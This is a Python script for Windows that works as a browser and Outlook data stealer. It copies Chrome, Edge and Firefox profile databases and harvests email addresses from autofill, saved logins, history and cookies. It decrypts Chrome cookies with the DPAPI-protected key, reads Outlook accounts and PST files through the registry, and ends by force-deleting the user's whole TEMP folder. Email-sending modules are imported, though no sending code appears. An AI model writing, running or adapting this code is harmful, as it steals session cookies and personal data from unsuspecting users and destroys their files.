import sqlite3
import os
import re
import smtplib
import winreg
import time
import base64
import getpass
from win32com.client import Dispatch
from win32.win32crypt import CryptUnprotectData
from Crypto.Cipher.AES import new, MODE_GCM
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders 
import json

USERNAME = getpass.getuser()
chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'


def bytes_to_hex(byte_data):
    return f"b'{''.join(f'\\x{byte:02x}' for byte in byte_data)}'"

def get_decryption_key(local_state_path):
    with open(local_state_path, 'r') as f:
        ekey = json.load(f)['os_crypt']['encrypted_key']
        dkey = base64.b64decode(ekey)[5:]
        dkey = CryptUnprotectData(dkey, None, None, None, 0)
        return dkey

def decrypt_value(encrypted_value, key):
    try:
        cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
        decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
        print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
        return decrypted_value.decode()
    except Exception as e:
        print(f"Decryption failed: {e}")
        return None

def chromEdgeOnly(chrome_path, email_pattern):
    profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
    emails = []

    for profile in profiles:
        wDatPath = os.path.join(chrome_path, profile, 'Web Data')
        twDatPath = os.path.join(os.getenv('TEMP'),f"wdat-{USERNAME}-{profile}-chrome.db")
        if os.path.exists(wDatPath):
            os.system(f'copy "{wDatPath}" "{twDatPath}"')
            conn = sqlite3.connect(twDatPath)
            cur = conn.cursor()
            cur.execute("SELECT value FROM autofill WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                #print(val[0])
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        lDatPath = os.path.join(chrome_path, profile, 'Login Data')
        tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat-{USERNAME}-{profile}-chrome.db")
        if os.path.exists(lDatPath):
            os.system(f'copy "{lDatPath}" "{tlDatPath}"')
            conn = sqlite3.connect(tlDatPath)
            cur = conn.cursor()
            cur.execute("SELECT username_value FROM logins")
            for val in cur.fetchall():
                #print(val[0])
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        hDatPath = os.path.join(chrome_path, profile, 'History')
        thDatPath = os.path.join(chrome_path, profile, f"hDat-{USERNAME}-{profile}-chrome.db")
        if os.path.exists(hDatPath):
            os.system(f'copy "{hDatPath}" "{thDatPath}"')
            conn = sqlite3.connect(thDatPath)
            cur = conn.cursor()
            cur.execute("SELECT url FROM urls WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat-{USERNAME}-{profile}-chrome.db")
        if os.path.exists(cDatPath):
            os.system(f'copy "{cDatPath}" "{tcDatPath}"')
            conn = sqlite3.connect(tcDatPath)
            cur = conn.cursor()
            cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
            decrypted_key = get_decryption_key(local_state_path)[1]
            #print(decrypted_key)
            print(f"\n\n\n\n TRIED COOKIEESS  for {profile}\n\n")
            for val in cur.fetchall():
                encrypted_value = val[0]
                if encrypted_value is None or len(encrypted_value) == 0:
                    continue
                decrypted_value = decrypt_value(encrypted_value, decrypted_key)
                print(decrypted_value)
            
            conn.close()

    return emails

def firefox(firefox_path, email_pattern):
    emails = []
    for profile in os.listdir(firefox_path):
        fh = os.path.join(firefox_path, profile, 'formhistory.sqlite')
        tfh = os.path.join(os.getenv('TEMP'), f"fh-{USERNAME}-{profile}-firefox.db")
        ck = os.path.join(firefox_path, profile, 'cookies.sqlite')
        tck = os.path.join(os.getenv('TEMP'), f"ck-{USERNAME}-{profile}-firefox.db")
        bh = os.path.join(firefox_path, profile, 'places.sqlite')
        tbh = os.path.join(os.getenv('TEMP'), f"bh-{USERNAME}-{profile}-firefox.db")
        lg = os.path.join(firefox_path, profile, 'logins.json')
        tlg = os.path.join(os.getenv('TEMP'), f"lg-{USERNAME}-{profile}-firefox.json")
        lgb = os.path.join(firefox_path, profile, 'logins-backup.json')
        tlgb = os.path.join(os.getenv('TEMP'), f"lgb-{USERNAME}-{profile}-firefox.json")
        if os.path.exists(fh):
            os.system(f'copy "{fh}" "{tfh}"')
            conn = sqlite3.connect(tfh)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_formhistory WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(ck):
            os.system(f'copy "{ck}" "{tck}"')
            conn = sqlite3.connect(tck)
            cur = conn.cursor()
            cur.execute("SELECT value FROM moz_cookies WHERE value LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()

        if os.path.exists(bh):
            os.system(f'copy "{bh}" "{tbh}"')
            conn = sqlite3.connect(tbh)
            cur = conn.cursor()
            cur.execute("SELECT url FROM moz_places WHERE url LIKE '%@%'")
            for val in cur.fetchall():
                try:
                    matches = re.findall(email_pattern, val[0])
                    emails.extend(matches)
                except:
                    pass
            conn.close()
        
        if os.path.exists(lg):
            os.system(f'copy "{lg}" "{tlg}"')
            with open(tlg, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                   u = login.get("usernameField", "")
                   matches = re.findall(email_pattern, u)
                   emails.extend(matches)
        
        if os.path.exists(lgb):
            os.system(f'copy "{lgb}" "{tlgb}"')
            with open(tlgb, "r", encoding="utf-8") as f:
                lgs = json.load(f)
                for login in lgs.get("logins", []):
                    u = login.get("usernameField", "")
                    matches = re.findall(email_pattern, u)
                    emails.extend(matches)

    return emails

chrome_emails = chromEdgeOnly(chrome_path, email_pattern)
edge_emails = chromEdgeOnly(edge_path, email_pattern)
firefox_emails = firefox(firefox_path, email_pattern)

emails = chrome_emails + edge_emails + firefox_emails

try:
    # Method 1: Outlook COM API
    outlook = Dispatch("Outlook.Application").GetNamespace("MAPI")
    for account in outlook.Accounts:
        emails.append(account.CurrentUser.Address)
    # Method 2: Raid PST files from registry
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Office\16.0\Outlook\Profiles')
    for i in range(winreg.QueryInfoKey(reg_key)[0]):
        subkey_name = winreg.EnumKey(reg_key, i)
        subkey = winreg.OpenKey(reg_key, subkey_name)
        try:
            pst_path, _ = winreg.QueryValueEx(subkey, '001f6700')
            with open(pst_path, 'rb') as f:
                data = f.read()
                emails.extend(re.findall(email_pattern.encode('utf-8'), data))
        except: pass
except: pass 

emails = list(set(emails))

print("AFTER FILTERINGGG")
for email in emails:
    print(email)
        
print(len(emails))

os.system(f"powershell remove-item -path {os.getenv("TEMP")} -force -recurse -erroraction silentlycontinue")